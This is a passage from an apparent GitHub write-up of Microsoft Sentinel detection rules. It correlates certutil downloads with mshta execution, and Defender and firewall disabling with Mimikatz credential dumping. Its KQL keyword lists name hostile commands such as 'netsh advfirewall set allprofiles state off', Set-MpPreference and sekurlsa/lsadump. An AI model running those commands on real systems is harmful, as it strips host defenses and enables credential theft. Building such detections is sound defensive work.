* Windows Security Event Logs:
  * Event ID `4688` (Process Creation - monitoring `certutil.exe` download parameters and `mshta.exe` execution)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following advanced KQL query correlates `certutil` download activity with subsequent `mshta` process execution within a 10-minute window on the same host and account:

    let Certutil = 
    SecurityEvent
    | where EventID == 4688
    | where Process has "certutil.exe"
    | where CommandLine has_any ("http://","https://","-urlcache")
    | project CertutilTime = TimeGenerated, Computer, Account;
    let Mshta = 
    SecurityEvent
    | where EventID == 4688
    | where Process has "mshta.exe"
    | project MshtaTime = TimeGenerated, Computer, Account;
    Certutil
    | join kind=inner Mshta on Computer, Account
    | where MshtaTime between (CertutilTime .. CertutilTime + 10m)
    | project Computer, Account, CertutilTime, MshtaTime

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164642" src="https://github.com/user-attachments/assets/4c3b5933-2e18-4dd1-ad91-1a4f609c7964" />


---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Rule | Evaluates complex cross-event timing windows across security logs. |
| **Run Query Every** | 5 Minutes | Continuously scans for correlated payload staging and execution behavior. |
| **Lookup Data From** | Last 6 Minutes | Incorporates a 1-minute overlap buffer to accommodate log ingestion latency. |
| **Severity** | High | Using native tools for download and execution represents an active, high-risk intrusion attempt. |
| **Status** | Enabled | Ensures the correlation rule is actively evaluating incoming telemetry. |

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164728" src="https://github.com/user-attachments/assets/ee081c7b-0ff6-443a-ae6d-a0fc246d7d9c" />


---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |

### Why map these entities?
* **Host:** Identifies the endpoint where the file was downloaded via certutil and executed via mshta.
* **Account:** Identifies the user security context executing the attack chain.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164652" src="https://github.com/user-attachments/assets/ead89bf8-eba1-4eaa-8050-3edd7513c5a9" />


---

## 🔄 Detection Workflow

    Attacker uses certutil.exe to download a remote payload (-urlcache / http)
                │
                ▼
    Target Host logs Event ID 4688 (Process Creation)
                │
                ▼
    Attacker executes the payload using mshta.exe within 10 minutes
                │
                ▼
    Microsoft Sentinel Scheduled Rule correlates certutil and mshta process events
                │
                ▼
    Alert Generated combining staging and execution phases
                │
                ▼
    Incident Created (Alert grouping disabled for immediate individual visibility)
                │
                ▼
    Automated Response Triggered (Add Triage Tag)
                │
                ▼
    SOC Analyst Assigned & Endpoint Isolation / Payload Removal Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Event ID **4688** logs `certutil.exe` execution with download flags (`http://`, `https://`, `-urlcache`).
* Event ID **4688** logs `mshta.exe` process execution by the same account on the same computer within **10 minutes** of the certutil download.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Correlating native tool downloads directly with script execution engines represents a critical, high-priority indicator of compromise. Disabling alert grouping ensures every unique detection triggers an immediate, standalone incident ticket for the SOC.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164737" src="https://github.com/user-attachments/assets/0e78a614-b1a2-4cf6-ba7e-5f13720e9628" />


---

## 🤖 Automated Responses
This correlation rule is linked to the following automation:
* **Add Triage Tag:** Automatically tags the incident upon creation to streamline analyst triage workflows.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164742" src="https://github.com/user-attachments/assets/646af3ca-a1f8-4b98-932d-2f394cb830bc" />


---

## ✅ Validation
This rule can be validated in a controlled lab environment by executing a benign certutil download command followed immediately by launching mshta. Sentinel will correlate the timestamps and generate a high-severity alert.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164747" src="https://github.com/user-attachments/assets/f3001e52-2e05-4936-9c59-3828683f4703" />


---

## 🎯 Security Impact
This correlation rule helps security teams:
* Detect abuse of Living-off-the-Land Binaries (LOLBins) for payload delivery.
* Catch multi-stage execution chains before malicious scripts execute.
* Prioritize high-fidelity triage tickets backed by multiple correlated security events.

---



⬆️ **[Back to Analytics Rule Summary](#analytics-rule-summary)**

---
# 🔗 Correlation 6: Defender Disabled → Firewall Disabled → Mimikatz

## 🎯 Objective
This core correlation rule tracks a complex, multi-phase attack chain combining defense evasion and credential access: disabling Microsoft Defender protections, disabling the Windows Firewall, and subsequently executing credential dumping tools like Mimikatz. It flags an attacker systematically stripping endpoint defenses before harvesting credentials.

---

## 📖 Threat Overview
Before executing noisy or high-privilege activities such as credential harvesting, advanced threat actors actively attempt to disable security controls to avoid detection. This campaign involves turning off real-time antivirus protection via PowerShell (`Set-MpPreference`), disabling firewall profiles via `netsh`, and then executing credential dumping utilities (`mimikatz`, `sekurlsa`, `lsadump`). Correlating these steps highlights a coordinated, premeditated intrusion.

---

## 🔥 Severity
**High**


<img width="1920" height="1020" alt="Screenshot 2026-08-04 164837" src="https://github.com/user-attachments/assets/bfecf593-fb22-4e82-9345-2d208ecd5321" />


---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Defense Evasion | Impair Defenses | T1562 |
| Credential Access | OS Credential Dumping | T1003 |


---

## 📂 Data Sources
* Windows Security Event Logs:
  * Event ID `4688` (Process Creation - monitoring Defender settings modification, firewall toggles, and credential dumping commands)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following advanced KQL query uses multiple `let` statements and inner joins to sequentially correlate Defender tampering, firewall disabling, and credential dumping within tight time windows:

    let DefenderDisabled = 
    SecurityEvent
    | where EventID == 4688
    | where CommandLine has_any ("Set-MpPreference","DisableRealtimeMonitoring","WinDefend")
    | project DefenderTime = TimeGenerated, Computer, Account;
    let FirewallDisabled = 
    SecurityEvent
    | where EventID == 4688
    | where CommandLine has_any (
        "netsh advfirewall set allprofiles state off",
        "Set-NetFirewallProfile"
    )
    | project FirewallTime = TimeGenerated, Computer, Account;
    let Mimikatz = 
    SecurityEvent
    | where EventID == 4688
    | where CommandLine has_any ("mimikatz","sekurlsa","lsadump")
    | project MimikatzTime = TimeGenerated, Computer, Account;
    DefenderDisabled
    | join kind=inner FirewallDisabled on Computer, Account
    | where FirewallTime between (DefenderTime .. DefenderTime + 10m)
    | join kind=inner Mimikatz on Computer, Account
    | where MimikatzTime between (FirewallTime .. FirewallTime + 15m)
    | project Computer, Account, DefenderTime, FirewallTime, MimikatzTime

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164858" src="https://github.com/user-attachments/assets/5ddb0ff0-1b11-4839-a372-5101f7c3343b" />

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164906" src="https://github.com/user-attachments/assets/907a7d5c-0a84-41ac-add2-e4457b8cc1c2" />



---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Evaluates continuous incoming telemetry streams instantly for multi-stage threat detection. |
| **Severity** | High | Tampering with core security defenses combined with credential theft represents an immediate, critical threat. |
| **Status** | Enabled | Ensures the correlation rule is actively running. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |

### Why map these entities?
* **Host:** Identifies the target endpoint where defenses were stripped and credentials were targeted.
* **Account:** Identifies the user security context executing the tampering and dumping sequence.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164915" src="https://github.com/user-attachments/assets/4e59c277-3f29-4b57-8b77-6a73f5bc7db2" />



---

## 🔄 Detection Workflow

    Attacker disables Microsoft Defender protections via command line
                │
                ▼
    Target Host logs Event ID 4688 (Process Creation)
                │
                ▼
    Attacker disables Windows Firewall within 10 minutes
                │
                ▼
    Attacker executes Mimikatz for credential dumping within 15 minutes
                │
                ▼
    Microsoft Sentinel NRT Rule correlates across all three event stages
                │
                ▼
    Alert Generated combining defense evasion and credential access phases
                │
                ▼
    Incident Created (Alert grouping disabled for immediate individual visibility)
                │
                ▼
    Automated Response Triggered (Add Triage Tag)
                │
                ▼
    SOC Analyst Assigned & Emergency Incident Response / Host Isolation Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Event ID **4688** logs a command disabling Defender protections (`Set-MpPreference`, etc.).
* Event ID **4688** logs a firewall deactivation command within **10 minutes** on the same computer and account.
* Event ID **4688** logs a credential dumping execution (`mimikatz`, etc.) within **15 minutes** of the firewall modification.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Stripping multiple security controls before dumping credentials is a definitive high-priority indicator of compromise. Disabling alert grouping ensures every unique detection triggers an immediate, standalone incident ticket for the SOC.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164937" src="https://github.com/user-attachments/assets/94a1e140-9d3b-4033-b311-19f8e9c83580" />


---

## 🤖 Automated Responses
This correlation rule is linked to the following automation:
* **Add Triage Tag:** Automatically tags the incident upon creation to streamline analyst triage workflows.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 164942" src="https://github.com/user-attachments/assets/b2da55bf-30d4-4fc2-b4bb-323652473db2" />

---

## ✅ Validation
This rule can be validated in a secure test environment by executing safe verification steps matching the process command lines. Sentinel will successfully correlate the multi-stage sequence across the time windows and generate a high-severity alert.


<img width="1920" height="1020" alt="Screenshot 2026-08-04 164948" src="https://github.com/user-attachments/assets/a5b8d1db-d411-4667-98dc-94dafc180fd1" />

---

## 🎯 Security Impact
This correlation rule helps security teams:
* Detect premeditated defense tampering before severe credential theft occurs.
* Catch complex multi-phase kill chains instantly via NRT evaluation.
* Ensure immediate, unbundled incident generation for critical adversary campaigns.

---

⬆️ **[Back to Analytics Rule Summary](#analytics-rule-summary)**

